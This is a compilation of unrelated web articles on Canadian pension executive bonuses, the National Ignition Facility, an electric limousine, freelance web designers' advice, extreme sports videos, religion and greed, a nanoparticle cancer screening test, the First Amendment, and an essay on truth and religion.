Maybe , just maybe , it is those things that impede our ability to be truly happy . "
Whatever happens to the economy , the Wojtowicz family hopes to remain self - sufficient .
Instead of spending their tax refund , as they usually did , they used it to pay down debt .
They stopped using credit cards and they 're trying to build up savings .
" I 'm working harder than ever , " Patrick says , " but it 's more satisfying work and ... it 's much easier to sleep at night . "

OTTAWA–Four top executives of the Canada Pension Plan Investment Board pocketed nearly $ 7 million in bonuses this year despite losing $ 24 billion of taxpayers ' money in bad investments , according to the board 's annual report released yesterday .
The report set off a highly charged debate inside and outside the Commons , with critics urging the Conservatives to roll back the bonuses .
" I do n't know how they can look themselves in the mirror and ( then accept ) cheques of Canadians ' money for millions of dollars for such a pathetic performance , " NDP Leader Jack Layton told reporters .
The bonuses were paid for the 2008 - 09 fiscal year , ended March 31 , even though their investments lost 18.6 per cent of their value during that period .
The executives ' total compensation was down about 30 per cent compared with the previous fiscal year .
" Remember , their salaries are already higher ... higher than the Supreme Court justices , higher than the Prime Minister , " Layton said .
" I mean they 're well paid and to turn over millions of dollars of bonuses to these individuals after they 've clearly lost billions is just not something that passes the test of common sense for Canadians . "
David Denison , president and CEO of the federal Crown corporation , receives an annual salary of $ 490,000 plus almost $ 2.4 million in bonuses , compared with Prime Minister Stephen Harper , who is paid about $ 315,400 a year .
The average CPP monthly retirement benefit for Canadians is $ 501.82 , and the maximum is $ 908.75 .
The Conservative government ignored opposition calls to urge the CPP Investment Board to roll back the bonuses .
Harper told MPs the Canada Pension Plan , worth about $ 100 billion at the end of the fiscal year , is " actuarially sound , " will benefit Canadians for many decades to come and does n't need politicians sticking their noses into the operation .
" Obviously the board is responsible independently for remuneration for the management of the plan .
I actually noticed , by the way , that the board , in fact , did drop a total compensation for its executives by 31 per cent last year but that is a board decision , not a government decision , " Harper said .
Joining Denison in collecting million - dollar bonuses are :
Graeme Eadie , senior vice - president real estate investments .
He receives bonuses totalling $ 1,077,239 this year plus a salary of $ 310,000 .
Mark Wiseman , senior vice - president private investments .
He receives bonuses of $ 2,112,115 and a salary of $ 335,000 this year .
Donald M. Raymond , senior vice - president public market investment .
He receives $ 1,296,573 in bonuses this year and a salary of $ 335,000 .
CPP Investment Board chair Robert Astley told a media briefing yesterday compensation is based on a pay - for - performance system that is tied directly to portfolio performance measured over a four - year time period .
" We have a four - year compensation model that enables us to compete for talent within the private sector world of capital markets , " Astley said .
Layton said it is ironic the Conservative government wo n't reduce the threshold for receiving employment insurance benefits , for example , for fear unemployed workers will find it too lucrative .
" I 'll tell you where the lucrative life is .
It 's amongst the senior managers of CPP giving themselves millions while they lose our billions , " he told reporters .
Liberal finance critic MP John McCallum called the bonuses " shockingly excessive " given the investment board lost so much money .

Kevin Gaudet , a spokesperson for the Canadian Taxpayers Federation , said it is " absurd to think that someone could lose $ 24 billion and end up getting a bonus for a positive performance . "

Outside a concrete slab of a building 10 stories high that holds the most powerful array of lasers and high - precision optics ever assembled , the scientists , engineers and workers who created the massive structure at Lawrence Livermore National Laboratory celebrated its dedication Friday .
The celebration in a heavily guarded section of the Lawrence Livermore lab marked the fact that research and tests are about to start at the new $ 3.5 billion National Ignition Facility , or NIF .
It will be an unprecedented , years - long physics experiment , and the outcome is by no means certain .
It 's purpose is to focus the immense energy in an array of 120 laser beams onto a tiny glass target the size of a BB shot , which is filled with hydrogen .
This is all done under immensely high pressure to make the target heat like the fiery interior of a star at a 180 million degrees Fahrenheit .
At that instant - theory says but experiments have yet to achieve - the hydrogen isotope atoms inside the target would fuse to become helium and release more energy in a trillionth of a second than it took to produce the blast in the first place .
To scientists that outcome is called " ignition , " a self - sustaining split - second of thermonuclear fusion that would - if successful - serve three vital functions :
-- Enable the keepers of America 's nuclear warheads to make sure that , after decades in storage , those elderly weapons are still " safe , secure and reliable , " as their keepers hope .
-- Enable astrophysicists and other scientists to study for the first time what kind of matter lies inside exploding stars , as well as in the deep high - pressure interior of Earth and its sister planets .
-- Finally , if the coming years of experiments , which start next year , are successful , a truly limitless supply of clean electrical energy with no carbon waste would be created using the limitless hydrogen fuel in the world 's oceans .
Friday 's ceremony was attended by members of Congress who had pushed for NIF 's construction , Gov. Arnold Schwarzenegger and several other dignitaries .
Outside the lab 's gates , members of the advocacy group Tri-Valley CARES demonstrated against the project .
They argued that it is grossly over budget , far behind schedule , a danger to the area and a covert project to train younger physicists to develop a new generation of nuclear weapons .
NIF 's completion is , in fact , behind schedule and far beyond its original budget , but the charge that new H - bombs would be under development has been denied repeatedly by everyone from the highest levels in Washington to the scientists and engineers at the Livermore lab .
On Friday , there were only words of wonder inside the Lawrence Livermore grounds .
George Miller , director of the Livermore lab , said he was sure that when the experiments reach peak power the NIF " will miniaturize the sun . "
Edward Moses , director of the new national facility , said it would answer the question : " Can you bring star power to Earth ? "
Thomas D'Agostino , administrator of the National Nuclear Security Administration , called Friday " a great day for science and a great day for national security , with expectations that will now be put to the test . "
He said NIF 's most urgent test is assuring that it works to validate computer codes so American nuclear weapons need never again be tested by explosions underground or anywhere else .
Schwarzenegger voiced his amazement that " we can create the stars right here " - while " creating 1,000 high - tech jobs for California . "
KAZ is an Italian - Japanese joint project to make an electric limousine .
Keio Advanced Zero-Emissions vehicle , that 's what KAZ stands for .
It took 5 years to build and cost $ 4 million but the result is more than impressive : it has 6 electric engines powering the limousines six wheels , each producing 74 horse - power and 74 lb - ft. of torque .
That means this baby goes from 0 to 62 mph in just 7 seconds , reaches a quarter mile in 15 seconds and has a top speed of 193.3 km /h .
Making the choice to go freelance ( or independent as I prefer to call it ) is a tough choice , I wish I had more knowledge about the pros vs cons when I made the decision to work independently .
Many of us are big fans of top web designers and their work .
Throughout the years these guys published many tutorials , websites , and scripts to help designers and developers improve their skills .
Today , we will sit down with them and get to know their experience about going freelance .
Let ’s take a look at a large group interview with top web designers about the pros & cons of going freelance .
For this interview each participant was asked the same set of questions .
Below you will see the questions listed with the corresponding responses from each person .
Thank you to all of the contributors who were so gracious in taking their time to answer my questions .
If you have any additional questions , leave a comment and – just maybe – they might respond .
No promises :)
1 . What is the one thing you like and hate most about working “ independently ” as opposed to working “ in-house ” ?
The absolute best thing about working independently is that I get to decide how , when , and where to do things .
I ’ve got to stick to client deadlines , but if I ’m sensible about planning , I can swap projects around to suit me , and I can take time out whenever I want if I need to do something non work - related .
I can work on the road , which allows me to do a lot of travelling , and I can do a variety of things – designing , illustrating , writing , speaking – all under the umbrella of work .
And if I want to take a few weeks off to record a new album or design myself a new personal site , I can .
It ’s brilliant !
The downside of independent working is that you ’re solely responsible for the way a project turns out , and it can often be hard to juggle the actual design work with things like project managing , client liasing , and all of the other stuff that comes with being self - employed .
Plus it can sometimes be lonely ; I miss the banter I had when I was working in - house with a bunch of other people .
But these are small things ; for me , the benefits far outweigh the drawbacks .
I ca n’t see myself going back to full - time employment any time soon .
Liam McKay of WeFunction
I think the thing that I prefer most , is that I certainly feel more valued , you get a lot more thanks , a lot more feedback and a more direct feel of responsibility for a good project .
It ’s not to say that there are n’t companies out there that do n’t do a good job of making their employer feel valued .
It ’s just there ’s definitely a bigger sense of value & appreciation attached to work when you are working directly for yourself and you have more of an involvement in the project .
What I like least about working independently is definitely the whole organization side of business .
Answering emails , sending invoices , keeping track of payments etc is n’t really where I thrive .
It ’s not that it ’s too difficult , there are a lot of tools to help speed up loads of these tasks , it ’s just easy to go into freelancing thinking that all you ’re going to be doing is designing , and forget about the things that go with it behind the scenes .
But having said that I ’ve realized now how important that side of work is , and am doing a lot better than I was .
Steve Snell of VandelayDesign
All of my experience in web design has come from learning on my own through books and tutorials , personal projects , work for friends and family , and working independently for clients .
I ’ve never worked for a design firm so it ’s hard for me to compare the two .
However , I have had several years of employment in other industries , and I think in many situations the frustrations are similar .
I prefer working independently because I can choose what I want to do and who I want to work with ( provided I have the right opportunities and the income potential to make it work ) .
If I ’m talking to a potential client and I do n’t think it is the right fit , I can just be up front and recommend someone else to them .
It saves me headaches , allows me to spend time in more effecient ways , and hopefully helps the client too .
Likewise , if there is a client that I really want to work with , I have the flexibility to try and make that happen .
There ’s no boss to tell me what I have to charge and what clients I have to work with .
On the other hand , I ’d say the negative is that I ’m limited to what I ’m able to accomplish on my own .
There ’s no team of people with different and complementary sets of skills .
Outsourcing is always an option , but without the right relationship and organization it ’s not really comparable to a strong team of employees from the same company .

I do n’t actually work “ independently ” per se , but I do work from home .
The lifestyle is the best part .
Not having a commute saves loads of time , stress , and gas money !
I like intertwining the daily chores of life with my workday as a way to take a break and refresh .
Office folks need to dedicate so much of their precious spare time to things like laundry and dishes , where I can take care of that stuff while getting up to stretch my legs .
The time this saves is amazing and adds up to loads of truly “ free ” time .
Danny Outlaw of OutLawDesignBlog
The one thing I like most about working from home has to be the ability to work my own hours .
If I want to stay up until 5 in the morning playing Halo 3 online , it ’s not a big deal .
If I want to leave work in the middle of the day and go work at the coffee shop via laptop , I can do that .
On the flip side , the thing I dislike the most of working from home , is working from home .
Sometimes its easy to get cabin fever from working from home all day everyday .
Niki Brown of Design - O - Blog
The thing I enjoy the most about working independently or freelancing is – the freedom .
I can work really early in the morning or really late at night .
I can work anywhere that has an internet connection .
This freedom is alluring to a lot of people thinking about making the freelance jump – but it also has its drawbacks .
Working independently can get lonely and feedback can be hard to come by .
This is why having a network of designers around you ( via twitter ) is a helpful thing .
Brian Hoff of TheDesignCubicle
Working as an independent designer I have always enjoyed interacting with the clients head on , instead of getting the details and clients vision from another source ( “ the higher ups ” ) .
I also enjoy the ability to work with clients that I feel comfortable with and projects I feel excited about .
There ’s nothing worse than designing a project you do n’t feel positive towards .
Trust me , the end results will show it .
On the flip side of things , I have always disliked doing the ‘ paperwork ’ part of freelancing – preparing contracts , invoicing , client management , etc .
But someone ’s got to do the dirty work , right ?
Walter Apai ’ of WebDesignerDepot
Working as a freelancer is great .
I set my own schedules and I do n’t have a boss to report to .
I certainly feel free to express myself and take my business in any direction that I want to .
I do n’t feel any creative constraints and the sky is truly the limit .
As a negative , I guess social interaction is what suffers the most from freelancing , unless you take clear steps to address this .
Garth Humbert of IAmGarth
I really enjoy the flexibility .
From your work schedule , to type of projects , to workload , to where you work – you get to make the decisions .
The toughest part for me is the business side .
These are generally non-billable , non-creative tasks that are necessary to run a business : Accounting , Generating Estimates / Proposals , Taxes , going to the Post Office , etc .
Liz Andrade of CMDshiftDesign
The thing that I find to be the biggest benefit to being on my own is that I have control over the time I work and the money I bring in .
This is a plus on a multitude of levels !
In my former in - house position , I had a set salary and really no cap on the amount of hours I would need to put in everyday .
Being independent , I now set the price for the work I do and because of this allow myself the freedom to have early afternoons if I need them , move my work schedule to fit other obligations and to budget time for learning news skills and improving my existing ones .
It seems like my in - house position was always working at full force , never a break , never a moment to look back or forward , and always 2 steps behind .
My days now are much calmer ( even when insanely busy ) and because of this I ’m producing better work and am much happier !
Maybe no one will believe me , but I seriously do n’t have anything I like more .
Sure , it is nice to know for certain what your paycheck will be every week – but I am happy to trade that in for having greater earning power and more control over my career !
I guess I miss getting those free fancy dinners at year end holidays ?
… but , that a real stretch .
Calvin Lee of MayhemStudios
What I like most about working independently is no boss / supervisor micro-managing me ; I ’m in control of the project and the decisions are made by me .
I ’m able to work faster and more efficiently , with no interruptions .
Working in - house , it ’s hard taking direction or respecting someone with less quality work than you .
The least favorite thing about being independent is the business side of design .
It ’s very time consuming , takes time away from designing .
These include : getting the proper licenses , permits , taxes , business forms , dealing with clients , self - promotion , finding clients : bringing in work , networking , dealing with client / vendors , bookkeeping , managing / tracking projects , contracts and getting paid .
2 . What advice would you give someone who is currently thinking about , or beginning to make the switch to the working independently ( freelance ) ?
Liam McKay of WeFunction
If you ’re currently in a business which does something similar to the kind of work you will be doing independently take an interest in what other people are doing , and how the business is run .
How does your company approach clients , what strategies to they have in place and how many techniques can you bring over into your own work .
If you have a good understanding of how all aspects of business work then it ’s not going to be too much of a shock when you ’re out there doing it on your own .
I ’m talking in really simple terms here , simple observations about the day to day tasks that everybody in the office takes care of , do n’t take it too far and get yourself in trouble looking at things you should n’t !
Chris Coyier of CSS - Tricks
I ’m not quite sure , I ’ve never taken that plunge myself .
I know just how people in this position feel though .
They are thinking how nice it could be to be your own boss .
Potentially make more money .
Work on projects of your choosing .
Sounds great , but then you worry about finding enough work , losing insurance , losing retirement , etc .
The big thing for me is how stressful freelance can be .
There is no buffer zone between you and clients when you freelance like there is when you are just an employee of a larger entity .
And we call know how clients can be .
Hair - pulling at best , hostile at worst .
Not to mention all the billing and complicated tax stuff …
Danny Outlaw of OutLawDesignBlog
Like I said before , being good at networking can go a long way to bring you more work , save you money , and make you more money .
Focus on networking and develop a brand for yourself .
The rest will fall into place .
Elliot Jay Stocks of ElliotJayStocks
Independent working is n’t for everyone , so try and get a feel for it before you make the leap .
The switch is n’t as hard as you think , but make sure you ’ve got plenty of freelancing experience .
For me , that meant doing freelance projects during evenings and weekends , and I did that pretty much the entire time I was working full - time ( 4 years ) , on and off .
It allowed me to build up my portfolio , got me doing projects I would n’t usually have encountered in my day jobs , and taught me how to be self - disciplined and deal with clients .
Fortunately , I also had the chance to work from home for the majority of the week when I was working for Carsonified , so that gave me a good taste of home - working life without any of the risks .
Also , get an accountant .
They ’re surprisingly cheap and will save you absolutely loads of time , effort , and money .
Niki Brown of Design - O - Blog
I would suggest that you save up as much money as you can before making the jump .
This will help you have something to fall back on in case all hell breaks loose . :)
Brian Hoff of TheDesignCubicle
Make sure the time is right and you have all ends covered .
Prior to taking the freelance plunge get yourself and your business organized !
When I started freelancing more and was working my way towards full time freelance , I wanted to create invoice templates , contracts , etc. that way I could spend more time on things of more importance , such as marketing , networking and , of course , designing .
Walter Apai ’ of WebDesignerDepot
You need to have a strong discipline to be a freelancer .
Set your work times and stick to them .
It ’s easy to let work overflow into your daily life and work should n’t become your life .
Make a clear cut separation between your career and your personal life .
Also , be proactive and stay on top of your game by constantly learning new things and evolving .
Finally , sit down and think really hard if this is what you really want and what your reasons are for this .
Are they valid , do they make sense and are they achievable ?
Steve Snell of VandelayDesign
My advice would be to start part - time while working a full - time job if at all possible .
That way you ’ll be able to get a good feel for what freelancing is like and if it ’s something that you really want to do full - time .
There ’s much less risk involved because you can start to build up a client base before making the plunge so by the time you go full - time it wo n’t be so hard to stay busy .
Another piece of advice is to save everything that you ’re making from freelancing part - time .
If you have a full - time job you can most likely live on that income .
If you can save all of your profit from part - time freelancing it will be a safety cushion for when you go full - time .
If it takes a few months to find much work it wo n’t be a big deal if you have that extra money .
Plus , you wo n’t get used to living on an income that consists of a full - time job and part - time freelancing .
That income will be difficult to replace for a while , so avoid getting comfortable on that income .
Another thing that helped me was to diversify your income .
Things like freelance writing for design blogs or managing your own websites can provide other income that supplements what you make on client work .
Garth Humbert of IAmGarth
Before you take the plunge , make sure you ’ve got some clients and projects lined up .
It ’s a big step and depending on what you need to make , you ’re gonna need to buckle down and work hard .
The other thing that ’s been really helpful for me is surrounding myself with other designers .
Twitter has been amazing at providing a steady stream of links , resources , witty comments , inspiration , and is a great sounding board .
Liz Andrade of CMDshiftDesign
I wrote a post about this a while back called “ Ditching your 9to5 to be Freelance & Fancy Free ” , and that post was in response to the emails I get from those of you thinking about making the leap and asking for advise .
Calvin Lee of MayhemStudios
Learn the business side of running a business from your day job , before going on your own : contracts , invoicing , billing , estimates , working with print shops , preparing print ready files , working with clients and file management .
Networking and making connections within / outside of your industry before going solo is very important in finding work , clients and projects .
It makes it a lot easier when you ’re on your own , since you ’ve already built trust working with them on your day job .
Self - promotion is equally important .
It does n’t matter how talented you are .
If nobody knows you ’re out there and available for projects .
Sign up for social networking websites like Twitter , Facebook , Linkedin , Bizik and the many portfolio sites to get your name and work out there .
I ’ve had the most success with Twitter as a way to network and connect with potential clients .
3 . If you could change any one thing about working independently what would it be ?
Liam McKay of WeFunction
It would probably be where I work , I definitely need to mix it up a little .
I ’m currently working from a desk in my room .
But ideally I ’d like to have my own office , and set myself some office hours , just to give myself some more structure and reality .
Another thing I ’m hoping to do is get a laptop and start working remotely , take my laptop somewhere nice when days in the office are getting a bit dull .
I think as a freelancer you have a lot more freedom , but I feel at the moment i feel I ’m not taking advantage of that .
Chris Coyier of CSS - Tricks
One thing I wish is that there was awesomly fast wireless internet that saturated the globe .
One day I ’d love to live in a remote Alaskan village , but I do n’t think I ’ll ever be able to live with out fast reliable internet =)
Elliot Jay Stocks of ElliotJayStocks
My plan is to do less client work and more ‘ product ’ work ( i.e : things I can sell ) , so I guess that ’s something I ’d like to change , and hopefully I ’ll achieve it .
But in general , there ’s very little I ’d change about my current freelance way of life .
Brian Hoff of TheDesignCubicle
I ’ve always considered myself a people ’s person and enjoy interacting and socializing with people in a work environment , so if I could have some random people just sitting behind me while I work from home that would be fantastic !
Any takers ?
I pay with good conversation and stories . :)
Walter Apai ’ of WebDesignerDepot
Ease up on the pressure .
Even though I do n’t have to report to anyone , self - pressure to excel and do well can be very taxing if not managed properly .
Garth Humbert of IAmGarth
Be available .
Artists and designers have a notorious rap for being flaky .
Surprise your clients by answering the phone , responding to emails quickly , and delivering on time .
Take care of your clients and they ’ll take care of you .
Liz Andrade of CMDshiftDesign
If I could change one thing today , it would be to have a special room in my home for my office .
Right now I work out of a nook in my living space but I dream of one day moving up to have a real room with a door ! :)
Calvin Lee of MayhemStudios
The worst is the isolation working alone , independently with no real human contact , not able to bounce ideas off someone .
Even though there is instant messenger and Twitter .
It ’s not the same as communicating with people “ In Real Life . ”
I do n’t know if there is a solution for this .
I guess that is just part of freelancing .
That is why I try to get out to networking events / design meetups as much as possible , to reconnect .
How do you find the right balance between working independently , and making time for non-work related activities ( i.e. family , friends , recreation ) ?
Steve Snell of VandelayDesign
That ’s something that I still struggle with .
My tendencany is to work as much as I can and the other stuff often takes a back seat .
One of the things I ’ve learned that really helps me is to have a set ending time for the day .
If I do n’t know how long I ’ll be working for the day , I usually wind up working almost from the time I get up till the time I go to bed .
But if I have a set time when I know my work day is over , it helps me to stay focused , get things done , and still have time for personal stuff .
So there you have it , a lot of great input from top web designers ,
If you found any of this info helpful or related to their answers drop them a line , and let them know .

Extreme :
When you type the word into Google , the number one search result is for the Extreme Sports Channel .
The runner - up is a Wikipedia page for the band who sang the acoustic ballad " More Than Words . "
Sorry Extreme .
As everyone knows , second place is the first loser , so this article wo n't be about you .
Thousands upon thousands of years before ESPN opened the world 's first official X Games in 1995 , human beings have been pushing themselves to the brink of destruction , testing their physical limits on land , air and sea .
In many ways we have been called a jealous species , not only of other humans who can run faster or jump higher , but of other animals who can fly , climb , dive and swim with such grace that countless people have actually died in their attempts to " soar . "
It 's taken a while before we called it a sport .
I prefer to think of us as a competitive species , constantly striving towards perfection .
Extreme sports show human beings at the ultimate height of performance , mentally and physically .
Not only do X - athletes need to be in top physical condition , not only does their equipment need to be state - of - the - art and in 100 % working capacity , and not only are they competing with other awesome athletes with awesome equipment , but they are competing with the unpredictable , uncontrollable , and uncaring forces of Mother Nature .
So why do we do we push ourselves to the extreme ?
Is it to fly like an eagle ?
To test our skills against insurmountable forces ?
Or is it because adrenaline is deliciousss and we wantsss it ?
Offering respect for the death defying , the following clips have been put together to show the pull these feats have with the people .
Based on views , here 's a compilation of the most popular extreme sports videos on YouTube .
If I 've missed any , let me know and I 'll get them in !
Extreme Skydiving
Extreme Base Jumping
You can't look for base jumping without finding the word " wingsuits " attached .
Check out these guys coming as close to flight as humanly possible .
Extreme Kayaking
When you look for extreme kayaking , this is by far the most popular clip :
While 45 mph is an insane speed to be in a kayak , I find this to be much more extreme :
Extreme Skateboarding
Extreme Snowmobiling
Extreme Snowboarding
Extreme BMXing
Extreme Skiing
Extreme Surfing
Extreme Paragliding
Extreme Windsurfing
Extreme Mountain Biking
As is typical with human nature , this one is popular due to its extreme wipeout .
Extreme Parkour
It ’s difficult to discern which of the Ten Commandments is most frequently ignored these days .
Switch on a daytime television talk show , and it ’s usually a toss up between “ thou shalt not covet thy neighbour ’s wife ” and “ honour thy mother and father ” : often both are violated at the same time .
Perhaps it ’s not entirely the fault of the trailer park residents who appear on such programmes : their ability to comply with these strictures is likely hindered by their inability to comprehend them in the first place .
“ Thou shalt not take the name of the Lord thy God in vain ” is also often cast aside .
Crime dramas , erotic programming , and even situation comedies invoke the higher being in situations as mundane as running out of toothpaste , let alone scenarios of extreme pleasure or stress .
Furthermore , even atheists have found it difficult to cry “ Science ! ” when someone cuts them off in traffic .
“ Thou shalt not steal ” is also flamboyantly disregarded .
Bernie Madoff is a prime example : despite having deep roots in the Jewish community , it is apparent that Judaism ’s most sacred , clear and basic rules went in one ear and out the other .
Billions passed through his hands , and then flowed into the tributaries of an opulent lifestyle ; his recently expressed remorse has the tenor of a criminal who is n’t sorry he broke the law , but dreaded the consequences of being caught .
However , perhaps the winner of this “ competition ” is the final commandment , “ thou shalt not covet thy neighbour ’s goods ” .
This is perhaps because it is the most awkward commandment to keep : it is one that frequently falls down the memory hole not just for lay people but for religious authorities as well .
Yet , this is likely the precise commandment that the religions of the world should be emphasising the most .
There is no mainstream religion that preaches covetousness .
There is no Gordon Gekko of Hinduism that informs believers that “ greed is good ” , no Ivan Boesky in the Orthodox pantheon of saints that informs the faithful that their way to heaven is paved with shares purchased utilising insider information .
In Islam , Mohammed specifically told believers that usury was a sin : this dictum has created a complex Islamic finance industry which tries to mediate between religious obligations and the need of individuals to get mortgages and loans .
Christ consistently challenged the rich to give up their possessions to the poor and follow him , warning that it would be easier for a camel to get through the eye of a needle than for them to get into heaven .
In 590 , Pope Gregory I listed “ Greed ” as one of the Seven Deadly Sins .
Yet avarice appears to be down the list of priorities for many religions in this day and age .
The Taliban appears to be more concerned with executing adulterers than with discouraging , say , the opium trade and the illicit profits gained by it ( rather , they benefit from this ) .
The Pope makes a point about preaching about contraception in Africa but was relatively muted in railing against society ’s recent failures to restrain its covetous impulses .
Most Pentacostal preachers appear to live in a moral universe in which lust permeates and contaminates every microcosm of society and every pore of the individual , but when it comes to overreaching ambition , they have little to say .
Perhaps this curious silence can partially be explained by hidden motives .
The Slovene philosopher Slavoj Zizek identified this in his description of what he called “ psuedo- fundamentalists ” :
In contrast to true fundamentalists , the terrorist pseudo - fundamentalists are deeply bothered , intrigued , fascinated by the sinful life of the non-believers .
One can feel that , in fighting the sinful Other , they are fighting their own temptation .
This statement has a wider application than perhaps Zizek intended .
For example , we have cases such as that of Ted Haggard , a former president of the National Association of Evangelicals , who was forced to admit that he ’d taken illegal narcotics and engaged in what he called “ sexual immorality ” with a male prostitute .
With his Evangelical hat on , he was most concerned with “ family values ” , but this was likely in part due to the tension with the temptations to which he had surrendered frequently .
Another possible motive is embarrassment .
While the full extent of the Vatican ’s wealth is unknown ; back in 1965 , it was estimated to be over $ 10 billion .
Even if time , bad management and inflation have taken their toll , it is certainly true that the Vatican retains one of the most precious art collections and libraries in the world .
Furthermore , while there are many charitable endeavours undertaken by the church , it is also certainly true that the Vatican is not adhering to a monastic vow of poverty either .
I personally recall sitting in a Catholic church in an upscale New York suburb one Christmas Eve , and being fascinated by the Italianate opulence of the altar and nave .
I have no idea if real gold was used , but certainly brass and marble were in abundance , as well as finely detailed oil paintings of the Saviour at various stations of the Cross .
Under these circumstances a call to help the poor , abandon avarice , does seem mildly hypocritical ; the priest , perhaps conscious of this and the fact that his parishioners were the type of people most likely to be afflicted by such a message , kept this call sotto voce .
But perhaps the strongest motive to avoid this subject is that people may associate religion with something difficult , and thus become unreceptive .
For example , to live as Christ demanded , i.e. , to give up one ’s possessions , to be kind , merciful and to forgive one ’s enemies no matter the injury they render , is extremely difficult .
Pulling back on the message so that only personal lust need be addressed makes it simpler : after all , most people do not get the opportunity to live the life of an unbridled hedonist .
It was only after the invention of effective birth control that restraints on sexual urges truly began to loosen , thanks to an absence of fear of potential consequences .
Perhaps because there would be nothing left to hold onto , many major religions have decided to not pull back from their previous position in light of this social change ; what they may have found more germane was to act as a moral voice against the excesses of consumerism and financial capitalism , rather than pay lip service to charity .
The closest a major religion has come to preaching this message is certain sects of fundamentalist Islam ; however , this element has largely been forgotten due to a change in emphasis towards an easier creed with which to rally people , i.e. , attacking the West for its immorality .
Under these circumstances , it is perhaps understandable that increasing numbers of people in the West proclaim to have no religion at all .
In 2002 , a poll indicated that 44 % of Britons had no religious affiliation whatsoever .
Yet , the need for an ethical framework , whether it comes through humanist or theological values is greater than ever : the trader who risks the future of his company in order to get a bigger bonus needs to have the voice of conscience whispering in his ear that other lives depend on the firm remaining afloat .
The businessman who intends to wreck a bit of unspoiled nature to build a factory needs to hear a message which says he is one of many stewards , not owners , of the earth .
The political leader needs to understand that lying , backstabbing and deception in the name of gain is not acceptable .
The fight against avarice needs to come from all locations and venues , and preached from churches and street corners , synagogues and university lecterns , mosques and talk shows .
If religion , however , chooses to maintain its present focus , the only thing it may perpetuate is its own decline .
Over - the - Counter Tests Use Gold to Screen for Cancer
An affordable and easy - to - use new kit can screen for lung , prostate , colon , and up to seven other types of cancer — and it may soon be available over - the - counter at your local pharmacy .
Cancer comes in many forms , and nearly all are treatable when caught in time .
The problem is , most people who have cancer do n’t seek medical attention early enough to get the help they need .
They may feel under the weather for days , weeks , or even months before they consider calling their physicians , dreading the thought of x-rays , bloodwork , and a barrage of other tests .
And for the growing percentage of uninsured and underinsured individuals in America , seeking medical attention is simply not an option , unless they ’re already positive that there ’s a serious problem .
In many cases , by the time a sick uninsured person visits a doctor to obtain a cancer diagnosis , it ’s already too late to remove the tumors .
With any luck , health care reform will soon make it easier for all Americans to receive affordable preventative and diagnostic care — but as far as cancer is concerned , a new development from the University of Central Florida could help ensure that more people will be able to receive a cancer diagnosis in time to effectively treat the disease .
The UCF scientists have developed a simple new DIY testing kit that can screen for lung , prostate , colon , and up to seven other types of cancer , which will be available over - the - counter at your local pharmacy , likely within the next two years .
The tests use a single drop of blood for screening , and take just several minutes to provide results .
Though they ca n’t definitively provide a cancer diagnosis , they can serve as an ideal first step for people who are worried that they may be ill , but are not prepared to visit their doctors for intensive testing .
“ If people are willing to do more screening , then they can catch any unusual changes due to cancer sooner , and the survival rates should increase , ” one of the test ’s developers , scientist Qun Huo , said at a recent conference .
The new test is faster and cheaper than existing screening tests , and uses small gold nanoparticles to detect chemical changes in the blood .
When the nanoparticles detect potentially cancerous chemicals in the blood , the test alerts the patient .
Though cancer may not always be present in such cases , the screening test can verify that a visit to the doctor is definitely in order .
Though doctors generally prefer to supervise all medical testing themselves , many physicians are optimistic about giving patients some control with this new advance screening system .
“ This test could certainly come in handy , ” Cheryl Baker , a doctor at M. D. Anderson Cancer Center Orlando told Discovery News .
“ If you pick up rising biomarker levels , then we can start treatment and increase the survival rate .
Hopefully this will help separate a cancer diagnosis from a death sentence . ”

The First Amendment to the Constitution reads , “ Congress shall make no law respecting an establishment of religion , or prohibiting the free exercise thereof ; or abridging the freedom of speech , or of the press ; or the right of the people peaceably to assemble , and to petition the Government for a redress of grievances . “
When we accept the government ’s ( Federal , State or Local ) requirement as to time and place to protest or demonstrate ;
When we agree to demonstrate only far from where the demonstration needs to take place ; when we agree to limit the scope of our grievances to avoid embarrassing the officials we are trying to wake up , then we are voluntarily giving up that First Amendment right .
What is not understood by most people is that the Bill of Rights does not give us permission to exercise the Rights of Man , it forbids the government from interfering !
Read the Bill of Rights , read the Constitution .
Then look at what the government has usurped with its misnamed PATRIOT ACT and the other acts of similar ilk that illegally cancel out the Constitution and its first ten amendments .
When
We the People cannot stand in front of the White House and make our grievances known , we might as well be demonstrating in front of the Reichstag in 1930 ’s Germany .
The results will ultimately be the same .

Firstly , I care about the truth .
I care about discovering the truth for myself and spreading it to others .
Both these things seem to necessitate that I try to open up dialogue .
It is not a matter of my assuming that I am right — though of course we all do assume this to a certain extent , otherwise we would n't hold the positions that we do .
Rather , I place the information I have encountered on the table and I encourage others to do the same .
I will present one perspective in the hopes that others will think critically about it , consider it , and 1 ) if they find it to be true , accept it or 2 ) if they find it to be false , inform me of this and explain why .
If I failed to do this I would fear that having looked at the information only through my own lens and conformation bias I would not be doing my best to discover the truth of the matter — and so I rely on the input and perspective of others .
If there are individuals who have no interest in the truth of any given matter it should not matter in the least to them what I say , as any argument that I present is appealing to people ’s interest in the reality of the situation .
If , on the other hand , individuals do care about the truth , it would seem that they would welcome dialogue as much as I myself do .
I am of the opinion that , ceteris paribus ( all other things being equal ) , it 's to the benefit of others to be made aware of the truth .
Thus if I did not make my perspective at least available , I would be doing them a disservice by denying them the opportunity to evaluate it for themselves .
It is because I love others and humanity that I seek the best for them and think it essential that we all come to understand things as fully as possible .
An uninformed populace is easily manipulated .
Let us consider , for a moment , what the result of public education taking on the creed “ allow anyone to believe whatever they want ” would be .
Chaos .
For one thing , it might not really even be possible to conduct such an education , as asserting anything would be providing a bias for one perspective over another .
It would certainly be impossible to grade — as everyone is “ entitled to their opinion . ”
It would also be doing a disservice and damaging students as well as the population .
“ You think 7 and 7 make 12 ?
Alright , go for it . ”
“ You think the flames from the Bunsen burner will taste like chocolate ice cream ?
Okay . ”
It would be impossible to move forward .
Secondly , in Christianity I find a number of things that I would describe as being harmful in general .
Now , to a certain extent I think individuals are entitled to do things to themselves that are harmful — though I think it would be a lapse in responsibility not to make them aware that this is indeed what they are doing .
On a larger scale , I find it entirely unacceptable to allow any institution to harm and exploit others either through its own ignorance or the ignorance of the general population .
Whatever happened to the appeal to reason of the Enlightenment ?
The Inquisition , the Crusades , the witch trials — these were all made possible by people either failing to recognize or to eliminate in the general population ignorance , superstition , and the appeal to nihilistic and dogmatic worldviews .
It is because of secular movements like that of the Enlightenment that the reins of power were taken out of the hands of the insane .
But even so , insane institutions have damaging influences if allowed to propagate without someone stepping up and speaking on behalf of reason .
Should we not stamp out sick and destructive worldviews wherever we see them ?
Or at the very least , should we not inoculate the general population against such insanity ?
What is the benefit in maintaining ignorance ?
It seems to me very small if not nonexistent .
